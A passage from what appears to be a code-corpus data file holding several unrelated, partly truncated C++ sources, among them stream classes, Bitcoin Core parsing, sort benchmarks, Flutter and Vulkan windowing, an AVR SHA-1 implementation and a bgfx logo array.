iSize)\n\t{\n\t\tm_nCurPos\t\t= 0;\n\t\t// \u6ca1\u6709\u8db3\u591f\u6570\u636e\u4e86\n\t\tmemcpy(m_buf, &m_buf[m_nCurPos], valid);\n\t\t// \u8bfb\u53d6\u5269\u4e0b\u7684\u6570\u636e\n\t\tm_nSize\t\t= _read(m_iFileHandle, &m_buf[valid], sizeof(m_buf)-valid);\n\t\t// \u6709\u6548\u6570\u636e\u7684\u6570\u91cf\n\t\tm_nSize\t\t+= valid;\n\t\tvalid\t\t= m_nSize;\n\t}\n\t// \u53d6\u6709\u6548\u6570\u636e\u7684\u6570\u91cf\n\tvalid\t\t= min(valid, iSize);\n\tmemcpy(ptr, &m_buf[m_nCurPos], valid);\n\tm_nCurPos\t+= valid;\n\treturn valid;\n#endif\n}\n\n//////////////////////////////////////////////////////////////////////////\n//////////////////////////////////////////////////////////////////////////\n\n\nSPMemoryStream::SPMemoryStream( BYTE* pBuf, unsigned int iSize )\n{\n\t//m_pBuf = static_cast< BYTE* >( pBuf );\n\tm_pBuf = pBuf;\n\tm_size = iSize;\n\tm_cur = 0;\n}\n\nint SPMemoryStream::Seek( int iOffset, int iOrigin )\n{\n\tswitch ( iOrigin ) {\n\tcase SEEK_SET: m_cur = iOffset; break;\n\tcase SEEK_CUR: m_cur += iOffset; break;\n\tcase SEEK_END: m_cur = m_size+iOffset; break;\n\tdefault : assert( false ); return 0;\n\t}\n\tif ( m_cur >= m_size ) m_cur = m_size;\n\treturn m_cur;\n}\n\nint SPMemoryStream::Read( void *ptr, unsigned int iSize )\n{\n\tif ( m_cur + iSize > m_size ) iSize = m_size-m_cur;\n\tmemcpy( ptr, m_pBuf + m_cur, iSize );\n\tm_cur += iSize;\n\treturn iSize;\n}\n\nint SPMemoryStream::Write( const void *ptr, unsigned int iSize )\n{\n\tif ( m_cur + iSize > m_size ) iSize = m_size-m_cur;\n\tmemcpy( m_pBuf + m_cur, ptr, iSize );\n\tm_cur += iSize;\n\treturn iSize;\n}\n\nbool SPMemoryStream::Eos () const\n{\n\treturn m_cur == m_size;\n}\n\nunsigned int SPMemoryStream::Tell () const\n",
    "#include \"palette.hpp\"\n#include \"imguiUtil.hpp\"\n#include <fstream>\n#include <nlohmann/json.hpp>\n\nstd::unique_ptr<SLM::Color[]> SLM::Palette::colors;\nint                           SLM::Palette::colorCount;\n\nSLM::Rgb SLM::Palette::DrawControlWindow()\n{\n\tImGui::RadioButton(\"Preset Color\", reinterpret_cast<int*>(&colorSelectionMode), 0);\n\tImGui::SameLine();\n\tImGui::RadioButton(\"Custom Color\", reinterpret_cast<int*>(&colorSelectionMode), 1);\n\n\tImGui::PushItemWidth(ImGui::GetContentRegionAvail().x);\n\tImGui::Combo(\n\t\t\"Preset\", &chosenPresetIndex, [](void*, int idx, const char** out_pcstr)\n\t\t{ \n\t\t\t*out_pcstr = GetColorsNames(idx);\n\n\t\t\treturn true; },\n\t\tnullptr,\n\t\tGetColorCount());\n\n\tImGui::ColorEdit3(\"Color\", customColor);\n\tImGui::PopItemWidth();\n\n\treturn GetCurrentColor();\n}\n\nvoid SLM::Palette::Serialize(SKSE::SerializationInterface* intfc) const\n{\n\tintfc->WriteRecordData(chosenPresetIndex);\n\tintfc->WriteRecordData(colorSelectionMode);\n\tintfc->WriteRecordData(customColor);\n}\n\nvoid SLM::Palette::Deserialize(SKSE::SerializationInterface* intfc)\n{\n\tintfc->ReadRecordData(chosenPresetIndex);\n\tintfc->ReadRecordData(colorSelectionMode);\n\tintfc->ReadRecordData(customColor);\n}\n\nconst char* SLM::Palette::GetColorsNames(size_t index)\n{\n\tassert(index < colorCount);\n\treturn std::get<0>(colors.get()[index]).c_str();\n}\n\nvoid SLM::Palette::LoadPaletteFile()\n{\n\tusing json = nlohmann::json;\n\n\tstd::ifstream file{ filePath.data() };\n\n\tif (file.fail())\n\t{\n\t\tlogger::warn(\"File at {} does not exist\", filePath);\n\t\treturn;\n\t}\n\n\ttry\n\t{\n\t\tjson data = json::parse(file);\n\n\t\tcolors.reset();\n\n\t\tjson colorsJson = data[\"colors\"];\n\n\t\tcolorCount = static_cast<int>(colorsJson.size());\n\t\tlogger::info(\"found {} colors in JSON file\", colorCount);\n\t\tcolors = std::make_unique<Color[]>(colorCount);\n\n\t\tint i = 0;\n\t\tfor (const json color : colorsJson)\n\t\t{\n\t\t\tconst auto rgb  = color[\"rgb\"];\n\t\t\tcolors.get()[i] = std::make_tuple(color[\"name\"], std::make_tuple(rgb[0], rgb[1], rgb[2]));\n\t\t\ti++;\n\t\t}\n\t}\n\tcatch (json::parse_error e)\n\t{\n\t\tlogger::error(\"{} at byte {}\", e.what(), e.byte);\n\t}\n\tcatch (json::exception e)\n\t{\n\t\tlogger::error(\"{}\", e.what());\n\t}\n}\n\nSLM::Rgb SLM::Palette::GetCurrentColor() const\n{\n\tif (colorSelectionMode == kCustomColor)\n\t{\n\t\treturn Rgb{ uint8_t(customColor[0] * 255), uint8_t(customColor[1] * 255), uint8_t(customColor[2] * 255) };\n\t}\n\treturn std::get<1>(colors[chosenPresetIndex]);\n}\n",
    "// Copyright (c) 2009-2022 The Bitcoin Core developers\n// Distributed under the MIT software license, see the accompanying\n// file COPYING or http://www.opensource.org/licenses/mit-license.php.\n\n#include <core_io.h>\n\n#include <primitives/block.h>\n#include <primitives/transaction.h>\n#include <script/script.h>\n#include <script/sign.h>\n#include <serialize.h>\n#include <streams.h>\n#include <util/result.h>\n#include <util/strencodings.h>\n\n#include <algorithm>\n#include <string>\n\nnamespace {\nclass OpCodeParser\n{\nprivate:\n    std::map<std::string, opcodetype> mapOpNames;\n\npublic:\n    OpCodeParser()\n    {\n        for (unsigned int op = 0; op <= MAX_OPCODE; ++op) {\n            // Allow OP_RESERVED to get into mapOpNames\n            if (op < OP_NOP && op != OP_RESERVED) {\n                continue;\n            }\n\n            std::string strName = GetOpName(static_cast<opcodetype>(op));\n            if (strName == \"OP_UNKNOWN\") {\n                continue;\n            }\n            mapOpNames[strName] = static_cast<opcodetype>(op);\n            // Convenience: OP_ADD and just ADD are both recognized:\n            if (strName.compare(0, 3, \"OP_\") == 0) { // strName starts with \"OP_\"\n                mapOpNames[strName.substr(3)] = static_cast<opcodetype>(op);\n            }\n        }\n    }\n    opcodetype Parse(const std::string& s) const\n    {\n        auto it = mapOpNames.find(s);\n        if (it == mapOpNames.end()) throw std::runtime_error(\"script parse error: unknown opcode\");\n        return it->second;\n    }\n};\n\nopcodetype ParseOpCode(const std::string& s)\n{\n    static const OpCodeParser ocp;\n    return ocp.Parse(s);\n}\n\n} // namespace\n\nCScript ParseScript(const std::string& s)\n{\n    CScript result;\n\n    std::vector<std::string> words = SplitString(s, \" \\t\\n\");\n\n    for (const std::string& w : words) {\n        if (w.empty()) {\n            // Empty string, ignore. (SplitString doesn't combine multiple separators)\n        } else if (std::all_of(w.begin(), w.end(), ::IsDigit) ||\n                   (w.front() == '-' && w.size() > 1 && std::all_of(w.begin() + 1, w.end(), ::IsDigit)))\n        {\n            // Number\n            const auto num{ToIntegral<int64_t>(w)};\n\n            // limit the range of numbers ParseScript accepts in decimal\n            // since numbers outside -0xFFFFFFFF...0xFFFFFFFF are illegal in scripts\n            if (!num.has_value() || num > int64_t{0xffffffff} || num < -1 * int64_t{0xffffffff}) {\n                throw std::runtime_error(\"script parse error: decimal numeric value only allowed in the \"\n                                         \"range -0xFFFFFFFF...0xFFFFFFFF\");\n            }\n\n            result << num.value();\n        } else if (w.substr(0, 2) == \"0x\" && w.size() > 2 && IsHex(std::string(w.begin() + 2, w.end()))) {\n            // Raw hex data, inserted NOT pushed onto stack:\n            std::vector<unsigned char> raw = ParseHex(std::string(w.begin() + 2, w.end()));\n            result.insert(result.end(), raw.begin(), raw.end());\n        } else if (w.size() >= 2 && w.front() == '\\'' && w.back() == '\\'') {\n            // Single-quoted string, pushed as data. NOTE: this is poor-man's\n            // parsing, spaces/tabs/newlines in single-quoted strings won't work.\n            std::vector<unsigned char> value(w.begin() + 1, w.end() - 1);\n            result << value;\n        } else {\n            // opcode, e.g. OP_ADD or ADD:\n            result << ParseOpCode(w);\n        }\n    }\n\n    return result;\n}\n\n// Check that all of the input and output scripts of a transaction contains valid opcodes\nstatic bool CheckTxScriptsSanity(const CMutableTransaction& tx)\n{\n    // Check input scripts for non-coinbase txs\n    if (!CTransaction(tx).IsCoinBase()) {\n        for (unsigned int i = 0; i < tx.vin.size(); i++) {\n            if (!tx.vin[i].scriptSig.HasValidOps() || tx.vin[i].scriptSig.size() > MAX_SCRIPT_SIZE) {\n                return false;\n            }\n        }\n    }\n    // Check output scripts\n    for (unsigned int i = 0; i < tx.vout.size(); i++) {\n        if (!tx.vout[i].scriptPubKey.HasValidOps() || tx.vout[i].scriptPubKey.size() > MAX_SCRIPT_SIZE) {\n            return false;\n        }\n    }\n\n    return true;\n}\n\nstatic bool DecodeTx(CMutableTransaction& tx, const std::vector<unsigned char>& tx_data, bool try_no_witness, bool try_witness)\n{\n    // General strategy:\n    // - Decode both with extended serialization (which interprets the 0x0001 tag as a marker for\n    //   the presence of witnesses) and with legacy serialization (which interprets the tag as a\n    //   0-input 1-output incomplete transaction).\n    //   - Restricted by try_no_witness (which disables legacy if false) and try_witness (which\n    //     disables extended if false).\n    //   - Ignore serializations that do not fully consume the hex string.\n    // - If neither succeeds, fail.\n    // - If only one succeeds, return that one.\n    // - If both decode attempts succeed:\n    //   - If only one passes the CheckTxScriptsSanity check, return t",
    "#include<benchmark/benchmark.h>\n#include<bits/stdc++.h>\n\n#define n 20000\nusing namespace std;\nvoid merge(int arr[],int start,int mid,int end)\n{\n    int * tmp=new int[end-start+1];\n    int k=0; \n    int i=start;\n    int j=mid+1;\n\n    while(i<=mid&&j<=end)\n    {\n        if(arr[i]<=arr[j])\n        {\n            tmp[k]=arr[i];\n            i++;k++;\n        }\n        else {\n            tmp[k]=arr[j];\n            j++;k++;\n        }\n    }\n\n    while(i<=mid)\n    {\n        tmp[k]=arr[i];\n        i++;k++;\n    }\n\n    while(j<=end)\n    {\n        tmp[k]=arr[j];\n        j++;k++;\n    }\n    \n    memcpy(arr+start,tmp,(end-start+1)*sizeof(int));\n    delete []tmp;\n}\n\nvoid merge_sort(int arr[],int len)\n{\n    int seg,start,mid,end;\n\n    for(seg=1; seg<len; seg*=2)\n    {\n        for(start=0; start<len-1;start+=2*seg)\n        {\n            mid=min(start+seg-1,len-1);\n            end=min(start+2*seg-1,len-1);\n            merge(arr,start,mid,end);\n        }\n    }\n}\n\nvoid quick_sort(int arr[], int begin, int end)\n{\n    if (end-begin>1)\n    {\n        int tmp = arr[begin];\n        int i = begin+1, j = end-1;\n\n        while (i<j)\n        {\n            if (arr[i] < tmp)  ++i;\n            else if (arr[j] > tmp) --j;\n            else\n            {\n                int t = arr[i];\n                arr[i] = arr[j];\n                arr[j] = t;\n            }\n        }\n\n        if (tmp > arr[j])\n        {\n            arr[begin] = arr[j];\n            arr[j] = tmp;\n        }\n\n        quick_sort(arr, begin, j);\n        quick_sort(arr, j, end);\n    }\n}\n\nmt19937 rng{random_device{}()};\n\nint * generateArray()\n{\n    int *tmp=(int*)malloc(sizeof(int)*n);\n    for(int i=0;i<n;i++) tmp[i]=rng();\n    return tmp;\n}\n\nstatic void test1_benchmark(benchmark::State& state) {\n  // Perform setup here\n  for (auto _ : state) {\n    // This code gets timed\n    int * arr=generateArray();\n    merge_sort(arr,n);\n    free(arr);\n  }\n}\n// Register the function as a benchmark\nBENCHMARK(test1_benchmark);\n\nstatic void test2_benchmark(benchmark::State& state) {\n  // Perform setup here\n  for (auto _ : state) {\n    // This code gets timed\n    int * arr=generateArray();\n    quick_sort(arr,0,n-1);\n    free(arr);\n  }\n}\n// Register the function as a benchmark\nBENCHMARK(test2_benchmark);\n\nBENCHMARK_MAIN();",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <string.h>\n#include <avr/io.h>\n#include <avr/pgmspace.h>\n#include \"sha1.h\"\n\n#define SHA1_K0 0x5a827999\n#define SHA1_K20 0x6ed9eba1\n#define SHA1_K40 0x8f1bbcdc\n#define SHA1_K60 0xca62c1d6\n\nconst uint8_t sha1InitState[] PROGMEM = {\n  0x01,0x23,0x45,0x67, // H0\n  0x89,0xab,0xcd,0xef, // H1\n  0xfe,0xdc,0xba,0x98, // H2\n  0x76,0x54,0x32,0x10, // H3\n  0xf0,0xe1,0xd2,0xc3  // H4\n};\n\nvoid Sha1Class::init(void) {\n  memcpy_P(state.b,sha1InitState,HASH_LENGTH);\n  byteCount = 0;\n  bufferOffset = 0;\n}\n\nuint32_t Sha1Class::rol32(uint32_t number, uint8_t bits) {\n  return ((number << bits) | (number >> (32-bits)));\n}\n\nvoid Sha1Class::hashBlock() {\n  uint8_t i;\n  uint32_t a,b,c,d,e,t;\n\n  a=state.w[0];\n  b=state.w[1];\n  c=state.w[2];\n  d=state.w[3];\n  e=state.w[4];\n  for (i=0; i<80; i++) {\n    if (i>=16) {\n      t = buffer.w[(i+13)&15] ^ buffer.w[(i+8)&15] ^ buffer.w[(i+2)&15] ^ buffer.w[i&15];\n      buffer.w[i&15] = rol32(t,1);\n    }\n    if (i<20) {\n      t = (d ^ (b & (c ^ d))) + SHA1_K0;\n    } else if (i<40) {\n      t = (b ^ c ^ d) + SHA1_K20;\n    } else if (i<60) {\n      t = ((b & c) | (d & (b | c))) + SHA1_K40;\n    } else {\n      t = (b ^ c ^ d) + SHA1_K60;\n    }\n    t+=rol32(a,5) + e + buffer.w[i&15];\n    e=d;\n    d=c;\n    c=rol32(b,30);\n    b=a;\n    a=t;\n  }\n  state.w[0] += a;\n  state.w[1] += b;\n  state.w[2] += c;\n  state.w[3] += d;\n  state.w[4] += e;\n}\n\nvoid Sha1Class::addUncounted(uint8_t data) {\n  buffer.b[bufferOffset ^ 3] = data;\n  bufferOffset++;\n  if (bufferOffset == BLOCK_LENGTH) {\n    hashBlock();\n    bufferOffset = 0;\n  }\n}\n\n#if defined(ARDUINO) && ARDUINO >= 100\nsize_t\n#else\nvoid\n#endif\nSha1Class::write(uint8_t data) {\n  ++byteCount;\n  addUncounted(data);\n#if defined(ARDUINO) && ARDUINO >= 100\n  return 1;\n#endif\n}\n\nvoid Sha1Class::pad() {\n  // Implement SHA-1 padding (fips180-2 \u00a75.1.1)\n\n  // Pad with 0x80 followed by 0x00 until the end of the block\n  addUncounted(0x80);\n  while (bufferOffset != 56) addUncounted(0x00);\n\n  // Append length in the last 8 bytes\n  addUncounted(0); // We're only using 32 bit lengths\n  addUncounted(0); // But SHA-1 supports 64 bit lengths\n  addUncounted(0); // So zero pad the top bits\n  addUncounted(byteCount >> 29); // Shifting to multiply by 8\n  addUncounted(byteCount >> 21); // as SHA-1 supports bitstreams as well as\n  addUncounted(byteCount >> 13); // byte.\n  addUncounted(byteCount >> 5);\n  addUncounted(byteCount << 3);\n}\n\n\nuint8_t* Sha1Class::result(void) {\n  // Pad to complete the last block\n  pad();\n  \n  // Swap byte order back\n  for (int i=0; i<5; i++) {\n    uint32_t a,b;\n    a=state.w[i];\n    b=a<<24;\n    b|=(a<<8) & 0x00ff0000;\n    b|=(a>>8) & 0x0000ff00;\n    b|=a>>24;\n    state.w[i]=b;\n  }\n  \n  // Return pointer to hash (20 characters)\n  return state.b;\n}\n\n#define HMAC_IPAD 0x36\n#define HMAC_OPAD 0x5c\n\nvoid Sha1Class::initHmac(const uint8_t* key, int keyLength) {\n  uint8_t i;\n  memset(keyBuffer,0,BLOCK_LENGTH);\n  if (keyLength > BLOCK_LENGTH) {\n    // Hash long keys\n    init();\n    for (;keyLength--;) write(*key++);\n    memcpy(keyBuffer,result(),HASH_LENGTH);\n  } else {\n    // Block length keys are used as is\n    memcpy(keyBuffer,key,keyLength);\n  }\n  // Start inner hash\n  init();\n  for (i=0; i<BLOCK_LENGTH; i++) {\n    write(keyBuffer[i] ^ HMAC_IPAD);\n  }\n}\n\nuint8_t* Sha1Class::resultHmac(void) {\n  uint8_t i;\n  // Complete inner hash\n  memcpy(innerHash,result(),HASH_LENGTH);\n  // Calculate outer hash\n  init();\n  for (i=0; i<BLOCK_LENGTH; i++) write(keyBuffer[i] ^ HMAC_OPAD);\n  for (i=0; i<HASH_LENGTH; i++) write(innerHash[i]);\n  return result();\n}\nSha1Class Sha1;\n",
    "/**\n * @file Main.cpp\n *\n * @brief Main file for demonstration of work.\n *\n * @author Hovsep Papoyan\n * Contact: papoyanhovsep93@gmail.com\n * @Date 2024-03-28\n *\n */\n\n#include \"Consumer.h\"\n#include \"InputValidator.h\"\n#include \"ParallelSolver.h\"\n#include \"Producer.h\"\n\nint main(int argc, char* argv[])\n{\n    try\n    {\n        if (auto validatedInput = InputValidator::getValidatedInput(argc, argv))\n        {\n            slv::ParallelSolver pSolver;\n            {\n                // Creating thread-safe STL adapter (thread-safe queue) from non thread-safe original STL adapter.\n                auto sharedContainer = mt::createThreadSafeSTLAdapterFrom(std::queue<std::vector<int>>{});\n                // Producer and consumer instances will work with this sharedContainer.\n                mt::Producer producer(sharedContainer);\n                mt::Consumer consumer(sharedContainer, std::ref(pSolver));\n                producer.enableWorkerThread();\n                consumer.enableWorkerThread();\n                producer.push({ std::move(validatedInput.value()) });\n                // This sleep is necessary to prolong the life of the producer and consumer,\n                // Otherwise after pushing validatedInput may not have time to get into sharedContainer.\n                std::this_thread::sleep_for(std::chrono::milliseconds(200));\n            }\n            std::cout << pSolver << std::endl;\n        }\n    }\n    catch (const std::exception& ex)\n    {\n        std::cerr << ex.what() << std::endl;\n    }\n    catch (...)\n    {\n        std::cerr << \"Unknown exception\" << std::endl;\n    }\n    system(\"pause\");\n}\n",
    "#include \"swap_chain.hpp\"\n#include \"device.hpp\"\n\nnamespace Vulkan \n{\n\n//-------------------------------------------------------------------------------//\n\nSwapChain::SwapChain(Window& window, Device& device) : window_(window), device_(device) \n{\n    createSwapChain();\n    \n    createImageViews();\n    \n    createRenderPass();\n    \n    createDepthResources();\n    \n    createFramebuffers();\n    \n    createSyncObjects();\n};\n\n//-------------------------------------------------------------------------------//\n\nSwapChain::~SwapChain() \n{\n    cleanup();\n\n    vkDestroyRenderPass(device_.getDevice(), renderPass_, nullptr);\n\n    for (size_t i = 0; i < MAX_FRAMES_IN_FLIGHT; i++) \n    {\n        vkDestroySemaphore(device_.getDevice(), renderFinishedSemaphores_[i], nullptr);\n\n        vkDestroySemaphore(device_.getDevice(), imageAvailableSemaphores_[i], nullptr);\n\n        vkDestroyFence(device_.getDevice(), inFlightFences_[i], nullptr);\n    }\n}\n\n//-------------------------------------------------------------------------------//\n\nvoid SwapChain::cleanup() \n{\n    vkDestroyImageView(device_.getDevice(), depthImageView_, nullptr);\n\n    vkDestroyImage(device_.getDevice(), depthImage_, nullptr);\n\n    vkFreeMemory(device_.getDevice(), depthImageMemory_, nullptr);\n\n    for (size_t i = 0; i < swapChainFramebuffers_.size(); i++)\n        vkDestroyFramebuffer(device_.getDevice(), swapChainFramebuffers_[i], nullptr);\n\n    for (size_t i = 0; i < swapChainImageViews_.size(); i++)\n        vkDestroyImageView(device_.getDevice(), swapChainImageViews_[i], nullptr);\n\n    vkDestroySwapchainKHR(device_.getDevice(), swapChain_, nullptr);\n}\n\n//-------------------------------------------------------------------------------//\n\nvoid SwapChain::createSwapChain() \n{\n    SwapChainSupportDetails swapChainSupport = device_.querySwapChainSupport(device_.getPhysicalDevice());\n\n    VkSurfaceFormatKHR surfaceFormat  = chooseSwapSurfaceFormat(swapChainSupport.formats);\n    VkPresentModeKHR presentMode      = chooseSwapPresentMode(swapChainSupport.presentModes);\n    VkExtent2D extent                 = chooseSwapExtent(swapChainSupport.capabilities);\n\n    uint32_t imageCount = swapChainSupport.capabilities.minImageCount + 1;\n    if (swapChainSupport.capabilities.maxImageCount > 0 &&\n        imageCount > swapChainSupport.capabilities.maxImageCount) \n    {\n        imageCount = swapChainSupport.capabilities.maxImageCount;\n    }\n\n    VkSwapchainCreateInfoKHR createInfo = {};\n    createInfo.sType    = VK_STRUCTURE_TYPE_SWAPCHAIN_CREATE_INFO_KHR;\n    createInfo.surface  = device_.getSurface();\n\n    createInfo.minImageCount    = imageCount;\n    createInfo.imageFormat      = surfaceFormat.format;\n    createInfo.imageColorSpace  = surfaceFormat.colorSpace;\n    createInfo.imageExtent      = extent;\n    createInfo.imageArrayLayers = 1;\n    createInfo.imageUsage       = VK_IMAGE_USAGE_COLOR_ATTACHMENT_BIT;\n\n    QueueFamilyIndices indices      = device_.findQueueFamilies(device_.getPhysicalDevice());\n    uint32_t queueFamilyIndices[]   = {indices.graphicsFamily.value(), indices.presentFamily.value()};\n\n    if (indices.graphicsFamily != indices.presentFamily) \n    {\n        createInfo.imageSharingMode         = VK_SHARING_MODE_CONCURRENT;\n        createInfo.queueFamilyIndexCount    = 2;\n        createInfo.pQueueFamilyIndices      = queueFamilyIndices;\n    } \n    \n    else \n    {\n        createInfo.imageSharingMode         = VK_SHARING_MODE_EXCLUSIVE;\n        createInfo.queueFamilyIndexCount    = 0;    \n        createInfo.pQueueFamilyIndices      = nullptr;\n    }\n\n    createInfo.preTransform     = swapChainSupport.capabilities.currentTransform;\n    createInfo.compositeAlpha   = VK_COMPOSITE_ALPHA_OPAQUE_BIT_KHR;\n\n    createInfo.presentMode  = presentMode;\n    createInfo.clipped      = VK_TRUE;\n\n    createInfo.oldSwapchain = nullptr;\n\n    if (vkCreateSwapchainKHR(device_.getDevice(), &createInfo, nullptr, &swapChain_) != VK_SUCCESS) \n        throw std::runtime_error(\"failed to create swap chain!\");\n\n    vkGetSwapchainImagesKHR(device_.getDevice(), swapChain_, &imageCount, nullptr);\n    \n    swapChainImages_.resize(imageCount);\n    \n    vkGetSwapchainImagesKHR(device_.getDevice(), swapChain_, &imageCount, swapChainImages_.data());\n\n    swapChainImageFormat_ = surfaceFormat.format;\n    \n    swapChainExtent_ = extent;\n}\n\n//-------------------------------------------------------------------------------//\n\nvoid SwapChain::createImageViews() \n{\n    swapChainImageViews_.resize(swapChainImages_.size());\n    \n    for (size_t i = 0; i < swapChainImages_.size(); i++) \n    {\n        VkImageViewCreateInfo viewInfo{};\n        \n        viewInfo.sType                              = VK_STRUCTURE_TYPE_IMAGE_VIEW_CREATE_INFO;\n        \n        viewInfo.image                              = swapChainImages_[i];\n        \n        viewInfo.viewType                           = VK_IMAGE_VIEW_TYPE_2D;\n        \n        viewInfo.format                             = swapChainImageFormat_;\n        \n        v",
    "#include <bits/stdc++.h>\nusing namespace std;\n \n \nstruct Line {\n    mutable long long slope, intercept, precision;\n    bool operator<(const Line& other) const { return slope < other.slope; }\n    bool operator<(long long x) const { return precision < x; }\n};\n \nstruct LineContainer : multiset<Line, less<>> {\n    static const long long inf = LLONG_MAX;\n    long long divide(long long a, long long b) {\n        return a / b - ((a ^ b) < 0 && a % b);\n    }\n    bool intersect(iterator x, iterator y) {\n        if (y == end())\n            return x->precision = inf, 0;\n        if (x->slope == y->slope)\n            x->precision = x->intercept > y->intercept ? inf : -inf;\n        else\n            x->precision = divide(y->intercept - x->intercept, x->slope - y->slope);\n        return x->precision >= y->precision;\n    }\n    void add(long long slope, long long intercept) {\n        auto z = insert({slope, intercept, 0}), y = z++, x = y;\n        while (intersect(y, z)) z = erase(z);\n        if (x != begin() && intersect(--x, y)) intersect(x, y = erase(y));\n        while ((y = x) != begin() && (--x)->precision >= y->precision)\n            intersect(x, erase(y));\n    }\n    long long query(long long x) {\n        assert(!empty());\n        auto line = *lower_bound(x);\n        return line.slope * x + line.intercept;\n    }\n};\n \nint main() {\n    ios::sync_with_stdio(false);\n    cin.tie(0);\n    long long queries;\n    cin >> queries;\n    char operation;\n    long long a, b;\n    vector<pair<long long, long long>> points;\n    vector<long long> answers(1e5 + 1);\n    long long max_val = 0;\n    LineContainer op;\n    for (long long i = 0; i < queries; i++) {\n        cin >> operation;\n        if (operation == 'A') {\n            cin >> a >> b;\n            op.add(a, b);\n        } else {\n            cin >> a;\n            cout << op.query(a) << endl;\n        }\n    }   \n}",
    "//\n//  BgfxAdapter.cpp\n//  bgfxVision\n//\n//  Created by Mariusz Pasinski on 16/04/2024.\n//\n\n#include <stdio.h>\n#include <bx/bx.h>\n#include <bgfx.h>\n#include \"BgfxAdapter.hpp\"\n\nstatic const uint8_t s_logo[4000] =\n{\n  0xdc, 0x03, 0xdc, 0x03, 0xdc, 0x03, 0xdc, 0x03, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, // ........ . . . .\n  0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, //  . . . . . . . .\n  0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0xdc, 0x08, //  . . . . . . ...\n  0xdc, 0x03, 0xdc, 0x07, 0xdc, 0x07, 0xdc, 0x08, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, // ........ . . . .\n  0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, //  . . . . . . . .\n  0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, //  . . . . . . . .\n  0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, //  . . . . . . . .\n  0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, //  . . . . . . . .\n  0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, //  . . . . . . . .\n  0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, //  . . . . . . . .\n  0xde, 0x03, 0xb0, 0x3b, 0xb1, 0x3b, 0xb2, 0x3b, 0xdb, 0x3b, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, // ...;.;.;.; . . .\n  0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, //  . . . . . . . .\n  0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0xdc, 0x03, 0xb1, 0x3b, 0xb2, 0x3b, //  . . . . ....;.;\n  0xdb, 0x3b, 0xdf, 0x03, 0xdf, 0x3b, 0xb2, 0x3f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, // .;...;.? . . . .\n  0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, //  . . . . . . . .\n  0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, //  . . . . . . . .\n  0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, //  . . . . . . . .\n  0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, 0x20, 0x0f, //  . . . . . . . .\n  0x20, 0x0f, 